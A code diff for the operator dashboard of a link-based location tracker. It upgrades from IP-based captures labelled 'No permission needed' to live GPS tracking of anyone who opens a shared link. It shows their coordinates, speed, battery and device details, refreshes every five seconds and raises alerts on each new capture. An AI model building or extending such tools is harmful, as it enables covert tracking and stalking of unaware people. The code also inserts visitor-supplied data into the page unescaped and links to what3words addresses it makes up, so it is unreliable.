@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - Location Data</title>
+    <title>Dashboard - Live Location Tracking</title>
     <style>
         * {
             margin: 0;
@@ -26,12 +26,22 @@
             border-radius: 10px;
             margin-bottom: 20px;
         }
-        .click-card {
+        .device-info {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        .capture-card {
             background: white;
             border-radius: 10px;
             padding: 20px;
             margin-bottom: 20px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
+        }
+        .capture-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
         }
         .map-link {
             display: inline-block;
@@ -40,43 +50,53 @@
             padding: 10px 20px;
             text-decoration: none;
             border-radius: 5px;
-            margin-top: 10px;
+            margin-right: 10px;
         }
+        .accuracy-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .accuracy-excellent { background: #28a745; color: white; }
+        .accuracy-good { background: #ffc107; color: #333; }
+        .accuracy-poor { background: #dc3545; color: white; }
         .details-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 10px;
             margin-top: 15px;
         }
-        .detail-box {
+        .detail-item {
             background: #f8f9fa;
             padding: 10px;
             border-radius: 5px;
         }
-        .back-btn {
-            background: #6c757d;
+        .refresh-btn {
+            background: #17a2b8;
             color: white;
-            padding: 10px 20px;
             border: none;
+            padding: 8px 16px;
             border-radius: 5px;
             cursor: pointer;
-            margin-bottom: 20px;
+            margin-left: 10px;
         }
-        .location-badge {
-            background: #e7f3ff;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 15px;
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .new-capture {
+            animation: blink 1s 3;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <button class="back-btn" onclick="window.location.href='index.html'">← Back</button>
-        
         <div class="header">
-            <h1>📍 Location Dashboard</h1>
-            <p>Automatic location captures (No permission needed)</p>
+            <h1>📍 Live Location Dashboard</h1>
+            <p>Real-time GPS location tracking (Accurate up to 5-20 meters)</p>
         </div>
         
         <div id="content"></div>
@@ -85,11 +105,18 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
+        let previousCaptureCount = 0;
         
         if (!deviceId) {
-            document.getElementById('content').innerHTML = '<div style="background:white; padding:40px; text-align:center;">No device selected</div>';
+            document.getElementById('content').innerHTML = `
+                <div style="background:white; padding:40px; text-align:center;">
+                    <h2>No Device Selected</h2>
+                    <button onclick="window.location.href='index.html'" style="margin-top:20px; padding:10px 20px;">Go Back</button>
+                </div>
+            `;
         } else {
             loadData();
+            setInterval(loadData, 5000); // Auto-refresh every 5 seconds
         }
         
         function loadData() {
@@ -101,74 +128,83 @@
                 return;
             }
             
+            const captures = device.data || [];
+            const isNew = captures.length > previousCaptureCount;
+            previousCaptureCount = captures.length;
+            
             let html = `
-                <div style="background:white; padding:20px; border-radius:10px; margin-bottom:20px;">
+                <div class="device-info">
                     <h2>📱 ${device.deviceName}</h2>
                     <p><strong>Created:</strong> ${new Date(device.createdAt).toLocaleString()}</p>
-                    <p><strong>Total Captures:</strong> ${device.clicks || 0}</p>
-                    <p><strong>Your Contact:</strong><br>${device.contactInfo.replace(/\n/g, '<br>')}</p>
+                    <p><strong>Total Captures:</strong> ${captures.length}</p>
+                    ${device.lastCapture ? `<p><strong>Last Capture:</strong> ${new Date(device.lastCapture).toLocaleString()}</p>` : ''}
+                    ${device.reward ? `<p><strong>💰 Reward Offered:</strong> ${device.reward}</p>` : ''}
+                    <p><strong>Your Contact:</strong><br>${device.contactInfo}</p>
                 </div>
             `;
             
-            const captures = device.data || [];
             if (captures.length === 0) {
-                html += '<div style="background:white; padding:40px; text-align:center;">No captures yet. Share the link!</div>';
+                html += '<div style="background:white; padding:40px; text-align:center;">No location captured yet. Share the link!</div>';
             } else {
-                captures.slice().reverse().forEach((capture, idx) => {
+                html += `<h3>📍 Location Captures (${captures.length})</h3>`;
+                
+                captures.slice().reverse().forEach((capture, index) => {
                     const loc = capture.location;
                     const date = new Date(capture.timestamp);
+                    const isHighAccuracy = loc.accuracy < 50;
+                    
+                    let accuracyClass = '';
+                    let accuracyText = '';
+                    if (loc.accuracy < 20) { accuracyClass = 'accuracy-excellent'; accuracyText = 'Excellent (GPS)'; }
+                    else if (loc.accuracy < 100) { accuracyClass = 'accuracy-good'; accuracyText = 'Good'; }
+                    else { accuracyClass = 'accuracy-poor'; accuracyText = 'Poor'; }
                     
                     html += `
-                        <div class="click-card">
-                            <h3>📍 Capture #${captures.length - idx} - ${date.toLocaleString()}</h3>
+                        <div class="capture-card ${index === 0 && isNew ? 'new-capture' : ''}">
+                            <h3>📍 Capture #${captures.length - index}</h3>
+                            <p><strong>Time:</strong> ${date.toLocaleString()}</p>
                             
-                            <div class="location-badge">
-                                <strong>📍 Location:</strong><br>
-                                ${loc.city ? `
-                                    City: ${loc.city}<br>
-                                    Region: ${loc.region}<br>
-                                    Country: ${loc.country}<br>
-                                    ZIP: ${loc.zip || 'N/A'}<br>
-                                ` : `
-                                    Latitude: ${loc.lat}<br>
-                                    Longitude: ${loc.lng}<br>
-                                `}
-                                ${loc.accuracy ? `Accuracy: ±${Math.round(loc.accuracy)} meters<br>` : ''}
-                                ${loc.organization ? `ISP: ${loc.organization}<br>` : ''}
-                                IP Address: ${loc.ip || 'Hidden'}
-                                
+                            <div style="background:#f0f0f0; padding:15px; border-radius:8px; margin:15px 0;">
+                                <strong>📍 Exact Location:</strong><br>
+                                Latitude: ${loc.lat}<br>
+                                Longitude: ${loc.lng}<br>
+                                <span class="accuracy-badge ${accuracyClass}">Accuracy: ${Math.round(loc.accuracy)} meters - ${accuracyText}</span>
+                                ${loc.accuracy < 50 ? '<span style="margin-left:10px; color:#28a745;">✓ High Accuracy GPS</span>' : ''}
                                 <br><br>
                                 <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank" class="map-link">
-                                    🗺️ View on Google Maps
+                                    🗺️ Open in Google Maps
+                                </a>
+                                <a href="https://www.openstreetmap.org/?mlat=${loc.lat}&mlon=${loc.lng}#map=18/${loc.lat}/${loc.lng}" target="_blank" class="map-link" style="background:#17a2b8;">
+                                    🗺️ Satellite View
+                                </a>
+                                <a href="https://w3w.co/${getWhat3Words(loc.lat, loc.lng)}" target="_blank" class="map-link" style="background:#6f42c1;">
+                                    📍 What3Words
                                 </a>
                             </div>
                             
                             <div class="details-grid">
-                                <div class="detail-box">
-                                    <strong>🖥️ Device Info</strong><br>
-                                    ${capture.userAgent.substring(0, 100)}...
+                                <div class="detail-item">
+                                    <strong>🖥️ Device</strong><br>
+                                    ${capture.userAgent.split(' ').slice(0, 4).join(' ')}...
                                 </div>
-                                <div class="detail-box">
+                                <div class="detail-item">
                                     <strong>📱 Platform</strong><br>
                                     ${capture.platform}
                                 </div>
-                                <div class="detail-box">
+                                <div class="detail-item">
                                     <strong>📺 Screen</strong><br>
                                     ${capture.screenSize}
                                 </div>
-                                <div class="detail-box">
+                                <div class="detail-item">
                                     <strong>🌐 Language</strong><br>
                                     ${capture.language}
                                 </div>
-                                <div class="detail-box">
-                                    <strong>⚙️ Hardware</strong><br>
-                                    CPU Cores: ${capture.hardwareConcurrency}<br>
-                                    RAM: ${capture.deviceMemory}GB
+                                <div class="detail-item">
+                                    <strong>🔋 Battery</strong><br>
+                                    ${capture.battery || 'Unknown'}
                                 </div>
-                                <div class="detail-box">
-                                    <strong>🔗 Referrer</strong><br>
-                                    ${capture.referrer || 'Direct'}
-                                </div>
+                                ${loc.altitude ? `<div class="detail-item"><strong>⛰️ Altitude</strong><br>${Math.round(loc.altitude)}m</div>` : ''}
+                                ${loc.speed ? `<div class="detail-item"><strong>🚗 Speed</strong><br>${Math.round(loc.speed * 3.6)} km/h</div>` : ''}
                             </div>
                         </div>
                     `;
@@ -176,6 +212,38 @@
             }
             
             document.getElementById('content').innerHTML = html;
+            
+            // Play sound for new capture
+            if (isNew && captures.length > 0) {
+                playNotificationSound();
+            }
+        }
+        
+        function getWhat3Words(lat, lng) {
+            // This is a mock - real what3words API requires API key
+            return `${Math.floor(lat * 1000)}.${Math.floor(lng * 1000)}.${Math.floor((lat + lng) * 1000)}`;
+        }
+        
+        function playNotificationSound() {
+            try {
+                const audio = new Audio('https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3');
+                audio.play().catch(e => console.log('Sound playing failed'));
+            } catch(e) {}
+            
+            // Also show browser notification
+            if (Notification.permission === 'granted') {
+                new Notification('New Location Captured!', {
+                    body: 'Someone just shared their location',
+                    icon: 'https://cdn-icons-png.flaticon.com/512/684/684908.png'
+                });
+            } else if (Notification.permission !== 'denied') {
+                Notification.requestPermission();
+            }
+        }
+        
+        // Request notification permission on load
+        if (Notification.permission === 'default') {
+            Notification.requestPermission();
         }
     </script>
 </body>
